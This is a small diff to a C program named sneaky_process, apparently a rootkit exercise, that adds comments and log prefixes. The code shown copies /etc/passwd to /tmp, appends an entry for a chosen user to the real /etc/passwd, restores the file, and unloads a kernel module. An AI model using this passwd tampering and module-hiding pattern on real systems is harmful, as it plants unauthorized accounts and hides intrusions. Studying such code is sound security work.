@@ -46,6 +46,8 @@ int replace_pwd() {
   if (close(real_pwd) < 0 || close(fake_pwd)) {
     perror("real_pwd /& fake_pwd failed to close");
   }
+  // add newline for desired user
+
   FILE *etc_file = fopen(REAL_PWD, "a"); // append to the end of current file
   if (etc_file == NULL) {
     perror(" failed to open etc_file");
@@ -66,9 +68,9 @@ int restore_pwd() {
   int fake_pwd = open(REAL_PWD, O_CREAT | O_WRONLY | O_TRUNC, 0600);
 
   if (real_pwd < 0 || fake_pwd < 0) {
-    printf(
-        "sneaky_process failed to open real_pwd /& fake_pwd,error number:%d\n",
-        errno);
+    printf("RESTORE_PWD:sneaky_process failed to open real_pwd /& "
+           "fake_pwd,error number:%d\n",
+           errno);
     return -1;
   }
 
@@ -112,7 +114,7 @@ int remove_module() {
   pid_t pid = fork();
   int status;
   if (pid == -1) {
-    printf("can't fork,error occured\n");
+    printf("REMOVE_MODULE:can't fork,error occured\n");
     exit(EXIT_FAILURE);
   } else if (pid == 0) { // child
 
@@ -120,7 +122,7 @@ int remove_module() {
       perror("failed to remove module\n");
     }
   } else { // parent
-    printf("parent process,pid = %u\n", getpid());
+    printf("REMOVE_MODULE:parent process,pid = %u\n", getpid());
     pid_t parent;
     if ((parent = waitpid(pid, &status, 0)) <= 0) {
       printf("waitpid() failed\n");
@@ -131,7 +133,7 @@ int remove_module() {
 
 int main(int argc, char *argv[]) {
   printf("sneaky_process pid = %d\n", getpid());
-  replace_pwd();
+  replace_pwd(); // copy the /etc/passwd file to /tmp/passwd
 
   pid_t sneaky_id = getpid();
   pid_t pid = fork();
